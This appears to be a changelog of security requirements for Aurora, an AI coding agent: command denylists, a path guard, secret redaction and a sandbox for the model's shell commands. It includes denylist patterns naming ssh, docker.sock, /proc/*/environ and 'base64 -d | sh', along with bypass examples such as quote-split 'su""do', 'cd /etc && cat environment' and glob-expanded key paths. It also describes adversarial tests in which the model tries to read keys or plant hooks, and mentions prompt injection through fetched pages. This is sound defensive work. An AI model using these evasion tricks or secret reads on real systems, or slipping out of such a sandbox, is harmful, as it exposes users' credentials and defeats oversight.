- **R447 — The web denylist also covers Docker, other machines and the secrets, and sees through quoting** (card `20261112-185835`, round 3 #13, 2026-11-13). `WEB_DENY_DEFAULT` gains `docker`/`docker.sock`, `ssh|scp|sftp|rsync|nsenter`, `su`, a bare `env`/`printenv`/`set`/`export -p`, `/etc/environment`, `/proc/*/environ`, `.ssh`, `os.system`/`subprocess`/`pty.spawn`, `base64 -d | sh` and `eval`. A command is matched both as written and with quotes and backslashes removed, so `su""do` or `s\\udo` no longer step round a pattern. A regex list is still not a sandbox: the real limits are R448 and the systemd unit. Test: `tests/test_deep_dive_2026_11_13.py`.
- **R448 — Commands the agent runs do not inherit secrets** (card `20261112-185835`, round 3 #1, 2026-11-13). `run_command` (foreground and background) starts the shell with the environment minus every variable whose name looks like a secret (`TOKEN`, `SECRET`, `PASSWORD`, `API_KEY`, `PRIVATE`, `CREDENTIAL`, `*_KEY`, `*_PASS`). Aurora's own process keeps them (it needs them for the model); `env` in a tool call shows none. Test: `tests/test_deep_dive_2026_11_13.py`.
- **R449 — An MCP server entry can limit which of its tools Aurora exposes (`tools:`)** (2026-11-14). `mcp_servers:` entries accept `tools: [name, ...]`. Only the listed tools of that server get a spec and a runner, so the model neither sees nor can call the others, and their schemas stop costing tokens on every request (one real memory server advertises 36 tools, about 6.5k tokens). No `tools:` key = every tool, as before. A malformed value (not a list of non-empty strings) exposes **no** tools from that server and warns, because an allowlist must fail closed. A listed name the server does not provide only warns. Test: `tests/test_mcp.py` (R449 section), fixture `tests/fixtures/multi_tool_mcp_server.py`.
- **R450 — Fixes from the review card: web guard, linear HTML, safer "always allow" (card `20261114-203412-aurora-issues`, 2026-11-14).** One entry, items named as on the card. Test: `tests/test_review_r450.py`.
  - **S6, B2 (linear HTML).** `html_to_text` (web_fetch) and `.html` attachments strip comments, tags and blocks in ONE forward pass (`aurora/htmltext.py`); a `<` with no later `>` is plain text, an unclosed comment or `<script` swallows the rest. The regexes it replaces took 33 s on 128 kB of `<!-- `. Each tag is searched forward only, so many `<script>` pairs cost no more.
  - **S1, S8, S2 (web path guard, `aurora/guard.py`).** In web mode only (switched on by `WebSession`; the terminal is unchanged) every file tool passes `guard.check` inside `run_tool`. Reads and writes are refused for secret places: `.ssh`, `.gnupg`, `.aws` folders, `/etc/environment`, `/etc/shadow`, `/etc/gshadow`, `/etc/sudoers*`, `/proc/<pid>/environ`, `.netrc`, `.git-credentials`, `.pgpass`, `keys.enc`, `*.token`, `*.pem`, `*.key`. Writes are also refused anywhere in `AURORA_HOME` except `workspace/` (allowlist, denylist, `web-denylist.txt`, `state.yaml`, extensions, bootstrap, sessions). Paths are resolved first, so `..` and symlinks do not step round it. `grep -r` over a parent skips those folders and files. A `web-denylist.txt` with no patterns means the defaults, not "deny nothing". The refusal text starts `[blocked on the web page`.
  - **S2 (redactor).** The "Env credential" pattern also sees NUL-separated text (`/proc/<pid>/environ`). **B5:** names ending in `PASS` (`MYAPP_DBPASS=`) are redacted.
  - **S3.** A `web_fetch` that `url_needs_approval` flags (R283) is put to the page even with auto-approve on.
  - **B1, S4 (web denylist).** The command patterns are matched against what is run: every string, nested ones included, of `run_command`, `wait_until` and `mcp_*` calls. A file tool is matched on its `path` only, so a README that says `docker` or code with `import subprocess` can be written. More patterns: `os.popen/exec*/spawn*`, `perl|ruby|php|lua -e`, `node -e`, `awk system(`, `base64/xxd -d` inside `$(...)` or backticks, and the policy files (`web-denylist`, `allowlist.yaml`, `denylist.yaml`, `state.yaml`, `.aurora/extensions|bootstrap`). A path glob in a command is expanded and the real names are matched too (`cat ~/.s?h/id_ed25519`, `/usr/bin/doc?er`). `deploy/aurora-web.service.example` carries the sandbox lines (`NoNewPrivileges`, `ProtectSystem`, `PrivateTmp`).
  - **S7 ("always allow" cannot widen).** A git command with `--output`, `--upload-pack`, `--receive-pack`, `--exec`, `--extcmd`, `--ext-diff`, `--textconv`, `--open-files-in-pager`, `-O…`, `-x`, `submodule foreach` or `bisect run` is "dangerous": exact-only, never covered by a stored `git grep` / `git log` / ... rule. `flock`, `setsid`, `stdbuf`, `ionice`, `chrt`, `taskset`, `unshare`, `script` and `gh` join the dangerous set. Only a TWO-token rule is a prefix rule; a longer stored rule (a whole command such as `zip -r a.zip src`) matches that command exactly, not with arguments appended.
  - **B3.** The Files listing skips a file that vanishes while it is listed instead of failing with a 500. **P1:** an office attachment may unpack to at most `MAX_ZIP_TOTAL` (100 MB) across all its parts, besides the 30 MB per part.
  - **S5.** The web handler has a 60 s socket timeout (longer than the 15 s stream heartbeat), and `/health` answers its outbound model probe from a 10 s cache.
  - **S9.** Commands do not inherit `SSH_AUTH_SOCK`, `DATABASE_URL`, `*_DSN` or `*_PAT` either (R448's list grew).
  - **S10.** `AURORA_HOME` loses group/other access on first use (mode only ever reduced), and the web notes, folders and vision files are written 0600.
  - **S11.** The page deletes its offline copies of chats and notes (service-worker cache entries under `/api/`) when the token is changed or the server answers 401.
  - **P3.** Each shadow repo records its folder (`checkpoints/<hash>/aurora-cwd`). Once a day per process, after a checkpoint, repos whose folder is gone or that nothing has touched for 90 days are removed (`rewind.sweep_stale`); a repo from before this has no mark and goes by age alone. Only 16-hex-digit directories with a `HEAD` are ever touched.
  - **Not done:** **B4** (six mobile UI tests fail on unchanged code) is a separate diagnosis; see the card.
- **R457 — `edit_file` applies a unique whitespace-only match (part 5 E of card `20261123-183314-aurora-bash-mode-weaknesses-deep-dive`, 2026-11-23).** When `old` is not in the file as written but matches exactly one run of whole lines once indentation and runs of spaces/tabs are ignored (`patch.whitespace_edit`), the edit is applied and `new` is re-indented the way the match is (its lines' leading `old` indentation becomes the file's); the result says so (`matched once with different indentation/spacing; new was re-indented`). Two or more such matches, part of a line, or any other difference is still the R309 error with its hint. The approval preview shows the same change. Measured first on the main machine's 131 sessions (2026-11-23): ~153 edit results, 8 "not found", none of them whitespace-only, so this is cheap insurance for small local models rather than a measured fix. Tests: `tests/test_r457_whitespace_edit.py`, `tests/test_edit_hints_and_output.py`.
- **R459 — The example web unit is a real sandbox (part 5 A of card `20261123-183314-aurora-bash-mode-weaknesses-deep-dive`, 2026-11-23).** The web denylist (R447, R450) is regexes, and a model can write a script and run it (`write_file x.sh` then `run_command "bash x.sh"`). `deploy/aurora-web.service.example` now makes the OS the boundary: `ProtectHome=tmpfs` with `BindPaths` for the workspace and `~/.aurora`, `BindReadOnlyPaths` for Aurora's own code except `config.yaml` and `aurora/providers/remote_context_limits.json` (which the page writes), `ProtectSystem=strict`, `InaccessiblePaths=/run/docker.sock`, `NoNewPrivileges`, `RestrictSUIDSGID`, `PrivateTmp` and the kernel protections. Checked with `systemd-run --user` and the same options: `~/.ssh` and other folders in the home are absent, the docker socket answers nothing, `sudo` fails, the code is read-only, the workspace, data dir and the two files are writable, and `aurora --web` starts and serves `/` and `/api/state`. A site applies it with a drop-in for its own unit; network access is not limited.

- **R466 — Deleting a chat on the web page revokes its share links (audit, 2026-11-24).** A chat deleted on the page
  (`/api/chat/delete`, or `/api/folder/delete` hiding the folder's chats) is only hidden, so its read-only
  `/shared/<token>` link (R418/R454) stayed live for up to 7 days, and the Share button that revokes it is on the chat's
  row, which was gone. Now: deleting revokes every link to those chats (`shares.delete_session`), and `/shared/` answers
  404 for a hidden chat, so a link kept by an older server is not served either. Expired links are dropped whenever a
  link is made, so they no longer count towards the 500-link limit. Tests: `tests/test_web_r466.py`.

- **R469 — The web denylist's glob check is bounded, and a glob it cannot finish is asked (audit, 2026-11-24).** R450
  matches a command's path globs as expanded (`cat ~/.s?h/id_ed25519`) with `glob.iglob`, on the turn thread before any
  approval, with no limit: `ls /*/*/*/*/*/*/zz` walked the filesystem for 15 s on the i3 (1 s for four levels, 2.9 s for
  five), up to 200 such words a command, and Stop could not cut it. `_bounded_glob` matches like iglob (hidden names only
  for a part that starts with `.`) but stops after 0.5 s per command (`GLOB_BUDGET_S`) or at 5,000 paths in one level
  (`GLOB_MAX_FRONTIER`). A command whose globs were not fully expanded is never auto-approved: the page asks, with a
  note saying why, so a deep glob cannot be used to step round the check. Tests: `tests/test_audit_r464.py`
  (`test_r469_*`), `tests/test_review_r450.py`.

- **R473 — The web denylist reads a command's paths from the directory it really runs in (audit, 2026-11-24).** The
  patterns matched the words as typed, so `cd /etc && cat environment`, `cat /etc/./environment`,
  `cat /etc//environment`, `cd /proc/self && cat environ`, or `cat environment` with the tool's own `cwd: /etc`, all
  read what `/etc/environment` blocks. `_resolved_paths` now follows `cd`/`pushd` (and the `cwd` argument) through the
  command, splits at `&&`, `||`, `;`, `|`, `&`, newlines, `(`, `$(` and backticks, drops redirections, and adds every
  word as a normalised absolute path to what the patterns see. A `cd $VAR` leaves the directory unknown. The denylist
  is still best effort (a script can build a path at run time): R474 (asking first) and R475 (the sandbox) are the
  boundary. Tests: `tests/test_audit_r470.py` (`test_r473_*`).

- **R474 — The web page asks before every write and command until auto-approve is turned on (owner, 2026-11-24, after an outside review).**
  `aurora --web` started with auto-approve on (R357/R392): anyone holding the token, or a prompt injection in a page
  the model fetched, could run commands with no one asked, and only the denylist (best effort, R473) stood in the way.
  The default is now off; the page's own switch (Settings › Chat) still turns it on and survives a restart, but only
  a stored `web_auto_approve: true` does, and an unreadable state file means off. Docs (README, FEATURES, CHANGELOG,
  REQUIREMENTS_OVERVIEW) say so. Tests: `tests/test_audit_r470.py` (`test_r474_*`), `tests/test_web.py`.

- **R475 — The model's shell commands run in a sandbox (owner, 2026-11-24, after an outside review: "stronger
  sandboxing and command execution isolation").** A command the model ran had everything the user has: ssh keys,
  `/etc/environment`, Aurora's keys, the Docker socket (root on the host), `systemd --user` and tmux (a way to start a
  process that outlives any check), and `~/.bashrc` or `.git/hooks` to plant something that runs later. Only the
  denylist (patterns, best effort) stood in front of that on the web. `aurora/sandbox.py` now runs each command the
  model starts (`run_command`, `wait_until`, background jobs) in a box: bubblewrap on Linux (own PID/IPC/UTS
  namespaces, new session, dies with Aurora), `sandbox-exec` on macOS. The machine is read-only except the workspace,
  `AURORA_HOME/workspace` (uploads, outputs), `~/.cache` and a private `/tmp` that lasts between commands. Hidden:
  `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.docker`, `~/.kube`, `~/.netrc`, `~/.git-credentials`, gh/gcloud config,
  `/etc/environment`, `AURORA_HOME` (but `skills/` read-only and `workspace/`), the Docker/containerd/podman sockets the
  user can reach, `/run/user/<uid>`, the host's `/tmp`; `.git/hooks` and `.git/config` stay read-only; agent and bus
  variables are dropped. The writable set comes from Aurora's working directory, never from the command's own `cwd`
  argument (the model picks that). Mount order makes hiding win over a writable parent. The box is tried for real once
  per process (a workspace write works, a home write and a hidden read fail); if that fails, the web page asks before
  every command even with auto-approve on, and the server log says why. `runtime: sandbox: web` (default) boxes the web
  page; `all` the terminal too; `off` none; `sandbox_network`, `sandbox_writable`, `sandbox_hide` tune it. Bash mode
  and `/skill` runs (typed by the user) are never boxed. The macOS profile is checked by the same trial run but was
  not run on a Mac when written. Tests: `tests/test_sandbox_r475.py` (36 attacks and uses, run in the real box).

- **R476 — Adversarial integration tests for the web server and the shell boundary (owner, 2026-11-24, after an
  outside review: "more extensive integration and adversarial tests").** `tests/test_adversarial_r476.py` runs a real
  server: 34 POST routes each get 40 hostile bodies (not JSON, not an object, every known key set to null, huge
  numbers, NUL bytes, path tricks, nested lists, 20 kB strings) and must answer below 500 with JSON, never a dropped
  connection; every POST and GET route refuses a missing, empty or near-miss token with 401; URL path tricks
  (`..%2F`, `%2e%2e`, absolute names) find nothing. Then the model itself attacks through real `run_command` calls
  with auto-approve on and the sandbox on (planted keys only, never a real secret): reading `~/.ssh` through a
  variable, appending to `~/.bashrc`, writing a git hook from base64; it must leak and change nothing, and the test
  fails when the sandbox is off. With `tests/test_sandbox_r475.py` (36 attacks inside the box) and the R473 bypass
  list. Tests: `tests/test_adversarial_r476.py`.

- **R477 — Python extensions behind a process boundary: the `aurora-ext/1` extension host (owner, 2026-11-24, after
  an outside review: "keep Python extensions as a compatibility layer").** Extensions were only ever loaded into
  Aurora's own process, with the whole engine in reach, so a non-Python Aurora (the Rust core planned for 2.0) could
  not use them, and a bad one could take the engine down. `python -m aurora.exthost` loads the same `SPEC` /
  `RUNNERS` / `register(engine)` files and serves their tools over newline-delimited JSON-RPC 2.0 on stdio
  (`initialize`, `tools/list`, `tools/call`, `shutdown`); the protocol is written down in
  `documents/EXTENSIONS_PROTOCOL.md`. Same loading rules as in process (name order, first name wins, bad files are
  warnings); a raising tool answers `is_error: true` and the host keeps running; extension prints go to stderr (fd 1
  is pointed at stderr, the protocol keeps its own copy). `register()` gets `cfg` and `runtime` only. `Client` is a
  Python client. The in-process loader is unchanged. Tests: `tests/test_exthost_r477.py` (a subprocess host; the same
  tools as the in-process loader; the bundled lint extension loads behind the boundary).

- **R481 — The Rust core's first tools: files and commands (owner, 2026-11-24).** `aurora-tools` has `read_file`
  (whole, `offset`/`limit`, `tail`, the 200 000-byte cap), `list_dir`, `write_file` and `edit_file` (an existing
  file keeps its mode; a CRLF file stays CRLF, R269; `old` must be unique unless `replace_all`), and `run_command`
  (bash, its own process group, secret variables left out, R448; the head and the tail of long output, R310; a
  timeout or Esc kills the whole group). Names, arguments and result strings are Python's, so a model sees the same
  tool either way. Reads need no approval and run in parallel; writes and commands always ask. Not yet: grep,
  find_files, apply_patch, web tools, background jobs (R245) and the R475 sandbox. The Rust approval policy has no
  allow rules yet: every gated call asks, and while `denylist.yaml` holds a rule, auto-approve asks or refuses instead
  (an unreadable denylist refuses every gated call, as in Python). Tests: `cargo test -p aurora-tools`,
  `cargo test -p aurora-storage approvals`.

- **R483 — The Rust core applies the allow and deny rules exactly as Python does (owner, 2026-11-25).**
  `aurora-storage` ports `aurora/approve.py`'s matcher: command rules match by token prefix on normalised tokens
  (quotes removed, `~` expanded); a chained, redirected or substituted command (R141) and a dangerous one (R149, R190,
  R242, R277, R298, R319, R450) match only exactly; only a two-token rule is a prefix rule; a single-token rule
  covers any arguments only for the read-only commands, but on the denylist it covers every argument (R149b); path
  rules are normalised (R195) and, for the allowlist, must also match after symlinks are followed (R209); web_fetch
  rules match per origin (R283); `cwd` outside the working directory (R303) and `wait_until`'s `then` (R299) always ask.
  Deny wins, an unreadable denylist refuses everything. "Always allow" and "always deny" write the rule Python would
  (`allowlist.yaml`, `denylist.yaml`, atomically), "allow for this session" keeps it in memory (R334), and the prompt
  shows how far "always" reaches before it is chosen (R335). `--ask` offers all of them. The denylist no longer turns
  `--yes` into asking (R481 did that while the matcher was missing). Not ported yet: `audit`/`prune` of old rules
  (R336) and the web denylist's `cd` tracking (R473). Tests: `cargo test -p aurora-storage`;
  `tests/test_rust_policy_r483.py` feeds about 3 500 generated rule, command, path and URL cases to `approve.py` and to
  `aurora-rs --policy-oracle` and requires identical answers.

- **R484 — The Rust core finds and redacts secrets as Python does (R58) (owner, 2026-11-25).** `aurora-core::secrets`
  ports `aurora/secrets.py`: the known key and token shapes (GUIDs, AWS, GitHub, Slack, Stripe, OpenAI-style,
  OpenRouter, Bearer, private key blocks, credential assignments in `.env` style with R328's code-value exemption), then
  the entropy fallback with its hash, date and word-name exemptions, the claim bitmap (R90e, R170b), the allowlist by
  SHA-256 and `<secret>` redaction that never leaves the tail of a nested match (R221). The loop asks the front end
  (`Frontend::secret_challenge`: keep, redact, always, stop; fails closed to stop) at the same five points as Python:
  the prompt before it is logged or sent, the model's reply, the content of `write_file` / `edit_file` / `apply_patch`
  (a redact changes the call that runs), tool output of every tool (a keep is remembered for the session, R329), and a
  command's own text, which only gets a notice (R131). A stop closes the turn with a valid history and never logs the
  secret: the skipped write's arguments are scrubbed first (Python logs stale empty arguments there). `aurora-rs -t`
  treats a likely secret as Python's headless mode does, ending the run with exit 1; `--ask` offers the choice.
  `runtime.redact_secrets` switches it off and `runtime.secret_allowlist` is read. Not ported yet: saving a new
  "always" value to the config, and `format_matches` for terminal display. Tests: `cargo test -p aurora-core`;
  `tests/test_rust_secrets_r484.py` compares both scanners over hand-written cases, seeded random tokens and about 400
  repository files; `tests/test_rust_compat_r482.py` stops the same scripted run in both Aurora's at a secret in the
  prompt, in written content and in tool output.

- **R485 — The Rust core boxes the model's commands as Python does (R475) (owner, 2026-11-25).** `aurora-tools::sandbox`
  ports the Linux half of `aurora/sandbox.py`: the machine read-only under bubblewrap with the workspace, Aurora's
  `workspace/`, `~/.cache`, `runtime.sandbox_writable` and a private kept `/tmp` writable; `~/.ssh` and the other secret
  places, `runtime.sandbox_hide`, the container sockets, the user runtime dir and Aurora's own home (apart from `skills/`
  read-only and `workspace/`) hidden; `.git/hooks` and `.git/config` read-only; own PID/IPC/UTS namespaces and a new
  session; agent and bus variables dropped; `runtime.sandbox_network: false` removes the network. The mount order is
  the one Python documents (a later mount covers an earlier one). A real trial run checks the box before first use; when
  it fails `aurora-rs` says so on stderr and runs unboxed, as Python's terminal does. `runtime.sandbox: all` turns it on
  (default `web` keeps the terminal unboxed, as in Python). A command's `cwd` argument never makes a folder writable.
  Not ported: macOS `sandbox-exec`, boxing `wait_until`, background jobs and skills (those tools do not exist in Rust
  yet). Tests: `cargo test -p aurora-tools sandbox` (real bubblewrap, skipped where it cannot run) and
  `tests/test_rust_compat_r482.py::test_sandbox_all_boxes_commands_the_same_way_as_python`.

- **R486 — The Rust core runs background jobs as Python does (R245, R246, R293) (owner, 2026-11-25).**
  `run_command(background=true)` starts the command detached in its own process group (inside the R485 box when
  there is one) and answers `[background job bgN started]` at once; `check_command` lists the jobs or shows one's
  status and the end of its output (`tail`, at least 200 characters); `cancel_command` (asks approval) kills the whole
  group. At most 4 jobs run at once and the 8 newest finished ones are kept; each stream is capped at 5 MB. The
  registry is process-wide, and `aurora-rs` kills every running job when it exits, so none outlives the run. The tool
  descriptions and result strings are Python's. Tests: `cargo test -p aurora-tools jobs` and
  `tests/test_rust_compat_r482.py::test_background_jobs_report_alike_and_never_outlive_the_run` (both Auroras, same
  script, no process left behind).

- **R489 — The Rust core has `grep` and `find_files` as Python does (R90b, R95b, R96m, R127, R292) (owner, 2026-11-26).**
  `grep` runs `grep -rnIE` with Python's prune list, stops reading at 200 000 bytes, drains stderr alongside so a flood
  of errors never stalls it, times out after 30 s, and reports exit codes of 2 or more as `[grep error: …]`, never as
  "no matches". `find_files` walks with the same prune list, matches the file name or the relative path, stops at 500
  results, and returns partial results on a 30 s timeout or a cancel. The tool descriptions and result strings are
  Python's. The web page's extra secret-place excludes come with the web front end (phase 6). Tests:
  `cargo test -p aurora-tools search`; `tests/test_rust_tools_r489.py` (14 calls on one tree, Python as the oracle).

- **R490 — The Rust core has `apply_patch`, and `edit_file` explains and forgives misses as Python does (R97, R220, R236, R269, R281, R309, R457) (owner, 2026-11-26).**
  `aurora-tools::patch` ports `aurora/patch.py`: hunks are found by content, as whole lines, in order, all or none; a
  removed `---` line is content, not a file header; a blank-line-only removal still applies; a uniformly CRLF file
  keeps its line endings. A miss says why (different whitespace, spacing, only inside a longer line, a later line
  differs). `edit_file` now takes a unique whitespace-insensitive match and re-indents `new` (R457). The approval
  preview shows the change the patch will really make, or why it will fail. Tests: `cargo test -p aurora-tools`;
  `tests/test_rust_tools_r489.py::test_patch_and_edit_match_python` (17 calls, LF and CRLF, results and bytes equal).

- **R491 — The Rust core has `wait_until` as Python does (R100, R125, R272) (owner, 2026-11-26).**
  One approval for the whole call. `command` reruns every `interval` seconds (at least 0.5, default 2) until it exits
  0 or `timeout` passes (1 to 300, default 60); each attempt gets only what is left of the timeout, the wait between
  attempts can be cancelled, `then` runs once right after the first success, and commands run inside the R485 box
  when there is one. The result strings are Python's, including the `[tool error: …]` for a bad number. Tests:
  `tests/test_rust_tools_r489.py::test_wait_until_matches_python` (9 cases, Python as the oracle).

- **R495 — The Rust core runs Python's extensions through the aurora-ext/1 host (R119, R157, R227, R283, R477) (owner, 2026-11-26).**
  At startup `aurora-rs` starts `python -m aurora.exthost` (`AURORA_PYTHON`, default `python3`). It loads Python's
  bundled extensions (web, MCP, lint, price refresh) and `AURORA_HOME/extensions/`, then adds their tools after the
  built-in ones. The model therefore gets exactly Python's tool list, and `runtime.web_search: false` hides the web
  tools in both. Calls go over the protocol. A raised error reads `[tool error: <name>: Type: msg]` as in process.
  Every `mcp_*` call asks for approval. `web_fetch` asks for a non-public or data-carrying URL: R283's check is
  ported to Rust (`aurora-tools::url`) and makes no DNS query. Load failures and MCP startup errors are printed as
  `· warning` lines, as in Python. A host that cannot start costs only the extension tools. Cancelling a running
  extension call stops the host, because v1 has no cancel method. The host's `register(engine)` view gains `web`,
  `models` and `extension_warnings`, which the bundled extensions read.
  Tests: `cargo test -p aurora-tools url`; `tests/test_rust_ext_r495.py` (same tool specs and results as Python, an
  extension that fails to load is reported, web tools hidden when turned off); `tests/test_rust_compat_r482.py`
  (now compares the full tool list).

- **R496 — Every ported requirement names its differential test (review note N4) (owner, 2026-11-26).**
  `03-FEATURE-PARITY.md` gains a Compat test column. It lists the `tests/test_rust_*.py` files that name the
  requirement, or that name the port its status note cites. `build_parity.py --check` fails when a PORTED or PARTIAL
  row has none. `tests/test_rust_details_r496.py` fills the gaps the check found. It covers non-object tool arguments
  (R268), the head and tail of long command output (R310), secret variables kept from commands (R448) and the
  private AURORA_HOME (R450), each checked against Python. The remaining gaps are providers (R2, R91, R223), which
  need live endpoints (N2).

- **R499 — Python's front ends can run each turn's loop on the Rust core (`runtime.core: rust`) (owner, 2026-11-26).**
  `aurora-rs --core` speaks `aurora-core/1` (`documents/CORE_PROTOCOL.md`) and `aurora/rustcore.py` drives it from
  `Engine.send`. Python keeps everything around the turn: secret check of the prompt, budgets, compaction before the
  prompt, session records, costs and the front end. Rust runs the loop: model requests, tools, the approval gate and
  rules, checkpoints, mid-turn compaction and extensions. The TUI, classic REPL and headless runs need no change. The
  default stays `python`. A turn that the Rust core cannot run yet goes to the Python loop with a `· this turn runs on
  the Python core (why)` notice: the web page (path guard R450 and command box R475 are Python-only; rule 4), plan
  mode, pictures, a missing `aurora-rs`. `AURORA_RS` names the binary. The `tool_result` event carries the call's
  arguments. A call skipped without being considered now logs `args: {}` in Rust too, as Python's `_skip` does. A
  missing `AURORA_HOME/extensions` folder is no longer passed to the extension host. Tests:
  `tests/test_rust_core_r499.py` (Python headless with `--yes`, a denial, a command plus a read, and y / deny with a
  note / steer / stop answered by a front end: same records, same requests, same files on both cores; the fallback
  notice; web mode stays on Python); `cargo test -p aurora-cli` (answer mapping).

- **R500 — The web page runs on the Rust core too: path guard and command box in Rust (R450, R475, R499) (owner, 2026-11-26).**
  `aurora-tools::guard` ports `aurora/guard.py`. On the web page, file tools refuse secret locations (reads and
  writes) and Aurora's own files outside `workspace/` (writes), on paths resolved through symlinks and `..`. `grep`
  gets the same extra excludes. `aurora-rs --core --web` turns the guard on, and it boxes commands unless
  `runtime.sandbox: off`, as Python's `service.web_sandbox` does for `aurora --web`. `aurora/rustcore.py` passes
  `--web` whenever the guard is on, so the web page no longer stays on the Python loop. Its own rules (web denylist,
  auto-approve, the R469 and R475 "asking" cases) stay in `WebFrontend.approve`, which answers the core's approval
  requests. Tests: `tests/test_rust_web_r500.py` (Rust's guard against `guard.check` on 170 tool/path cases plus the
  grep excludes; a web turn on each core refuses a prompt-injected `~/.ssh` read the same way; a web turn on each core
  boxes a command the same way: the workspace is writable, the home folder is not, a secret is unreadable).

- **R501 — The macOS command box (sandbox-exec) in the Rust core (R475, review note N1) (owner, 2026-11-26).**
  `aurora-tools::sandbox` picks the box the machine has, as Python's `platform_tool` does: bubblewrap on Linux,
  `sandbox-exec` on macOS. `macos_profile` writes the same SBPL profile as `aurora/sandbox.py`: writes allowed only
  to the workspace, Aurora's `workspace/`, `~/.cache`, extra folders, the box's tmp and the per-user temp dir; hidden
  places and AURORA_HOME unreadable, with `skills/` readable and `workspace/` writable again; `.git/hooks` and
  `.git/config` read-only; container sockets shut; the network off when asked. On macOS a boxed command keeps
  `TMPDIR`, starts in the caller's working directory, and the trial run names the tool. Tests:
  `tests/test_rust_macos_r501.py` (the profile text equals Python's for the same policy, network on and off; on a Mac
  it also really runs); `cargo test -p aurora-tools sandbox` (the box tests now also run on macOS). The real runs on
  macOS are in `documents/migration/HANDOFF-MACOS.md`.

- **R507 — Python's loop tests run on the Rust loop too, and what they found is fixed (R505) (owner, 2026-11-26).**
  With `AURORA_CORE=rust`, `tests/conftest.py` sends every direct `agent.run_turn(...)` call through the Rust core:
  the caller's history list, system prompt, cap and provider object (bridged), with scanning on when the caller gives
  a `secret_challenge` (as a bare call switches it on). Plan-mode calls, and the engine's own fallback, keep Python's
  loop. A test about one of Python's own hooks (the checkpoint and fold callbacks, Python's clock, a faked Python
  tool, a Python provider's bulk hook) or a known difference (D8 explain, steering) is marked `python_loop` and names
  the Rust test that covers the same behaviour. What the run found, now on both cores:
  - the repeat nudge (R27) and the stop after three repeating rounds (R350) were missing from the Rust loop;
  - auto-continue answered "never ask again", so the R314 backstops (50 rounds, an hour) did not apply;
  - the spend limit (R340) was never checked mid-turn: the core now asks the front end (`budget`) after each reply
    with tool calls and stops or warns as Python does;
  - the allow and deny lists were read once per core, not at each turn's start (R170a, R196): the core re-reads
    them every turn and says so when one is unreadable;
  - the secret allowlist and the session's "keep" answers (R329), and the "allow for this session" rules (R334),
    lived in one core process: the front end's sets go with each turn and come back with `done`;
  - generation speed (R352) and the last reply's size for the context gauge (R84) were not reported;
  - a bridged reply's assistant message was the provider's, from before the loop redacted it (R58): it is rebuilt
    from the redacted result;
  - `on_usage` and `on_approval` were assumed present, and a failing approval logger could end the turn (R133c).
  Tests: the suite with `AURORA_CORE=rust` (the nightly's second run); `agent::tests::the_repeat_nudge_needs_the_same_call_and_the_same_result`,
  `agent::tests::a_model_that_keeps_repeating_is_stopped`; `tests/test_rust_bridge_r505.py`.
- **R511 — The config editor hides secrets inside values too (review F5) (owner, 2026-11-27).**
  Besides secret-named keys (R427), the page never sees a URL's password (`https://user:«hidden»@host`), a
  secret-named query value (`?api_key=«hidden»`) or a secret-named `--flag=«hidden»` in a command or a list item.
  Saving puts each one back at the same place. Tests: `tests/test_review_r509_r512.py`.
- **R512 — web_fetch checks the target's address before it sends the request; proxies are handled (review F6) (owner, 2026-11-27).**
  The R301 rebinding guard read the peer address after the GET had gone out, so a private service still received it.
  Each hop is now resolved first, and a name that resolves to a private or local address is refused before anything is
  sent (unless the URL itself was approved as private). The peer check stays as a second line. When an environment
  proxy carries the request, the peer is the proxy, so that check is skipped instead of blocking every page; the
  pre-request check still applies. Tests: `tests/test_review_r509_r512.py`.
